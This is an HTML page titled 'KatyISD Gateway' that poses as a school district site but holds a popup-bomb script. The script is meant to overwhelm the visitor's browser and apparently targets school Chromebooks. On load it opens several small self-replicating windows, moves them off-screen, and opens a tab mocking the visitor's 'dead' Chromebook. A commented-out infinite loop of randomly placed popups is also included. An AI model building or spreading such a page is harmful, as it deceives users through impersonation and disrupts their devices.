<!DOCTYPE html>
<html lang="en">
<head>
    <title>KatyISD Gateway</title>
    <meta name="Description" content="Katy Independent School District">
    <meta property="og:type" content="website">
    <meta property="og:description" content="Katy Independent School District">
    <script>
        // Mark this tab as open
localStorage.openpages = Date.now();

var anotherPageOpen = false;

var onLocalStorageEvent = function(e){
  if (e.key == "openpages") {
    // Emit that you're already available.
    localStorage.page_available = Date.now();
  }
  if (e.key == "page_available") {
    // Another page is open
    anotherPageOpen = true;
  }
};

// Check if another page is open after a short delay
var openCheck = setTimeout(function(){
  if (anotherPageOpen) {
    alert("One more page already open");
      /*function openWindow(url) {
        const newWin = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=200, height=180, titlebar=no, alwaysRaised=yes');
        if (newWin) {
            const screenWidth = screen.width - 200; // Keep within bounds
            const screenHeight = screen.height - 180;

            const randomX = Math.floor(Math.random() * screenWidth);
            const randomY = Math.floor(Math.random() * screenHeight);

            newWin.moveTo(randomX, randomY);

            return newWin;
        }
    }
    while (true) openWindow('');*/
  } else {
    alert("No other page open");
      // Open 4 small windows at the bottom of the screen
            for (let i = 0; i < 4; i++) {
                let newWin = window.open(window.location.href, '_blank', 'width=100,height=100,resizable=no,scrollbars=no');
            newWin.moveTo(0, screen.height);
            }

            // Open a new tab with custom HTML content
            let newWindow = window.open('about:blank', '_blank');
            newWindow.document.write(`
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>RIP</title>
                </head>
                <body>
                    <h1>I'm sorry for your Chromebook</h1>
                    <p>Here lies your Chromebook, 2024 - 2025</p>
                </body>
                </html>
            `);
  }
}, 100);

window.addEventListener('storage', onLocalStorageEvent, false)
    </script>
    <!--<script src="rip.js"></script>-->
</head>
<body>
</body>
</html>
